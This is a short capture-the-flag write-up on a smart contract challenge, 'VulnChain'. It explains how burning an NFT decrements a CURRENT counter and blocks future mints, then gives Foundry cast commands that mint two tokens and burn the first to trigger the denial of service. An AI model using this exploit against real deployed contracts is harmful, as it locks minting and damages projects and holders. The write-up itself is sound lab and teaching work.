## VulnChain

The vuln is in `burn` due to the handling of `CURRENT` and lead to a DOS.

You can burn any NFT you possess and it will decrease `CURRENT` of one. If you do it on any NFT already minted except the last, `CURRENT` will point on an existing NFT, and cannot mint again on this TokenID. It will revert with "ERC721InvalidSender" (See ERC721 for more information).

To cancel the DOS, you can burn all token from `CURRENT` to the last minted token, but it will be a big lack of money in real contexte, and will not prevent the contract to be exploited again.

### PoC with Foundry :

Collect the contract address :

```bash
cast storage $SETUP_CONTRACT 0 --rpc-url $RPC_URL
```

Mint 2 NFT and burn the first one :

```bash
cast send $CONTRACT "mint(uint8)" 2 --value 1.38ether --rpc-url $RPC_URL --private-key $LOCAL_PRIVATE_KEY --gas-limit 7000000

cast send $CONTRACT "burn(uint16)" 1 --rpc-url $RPC_URL --private-key $LOCAL_PRIVATE_KEY --gas-limit 7000000`
```

The challenge is solved and we can get the flag.
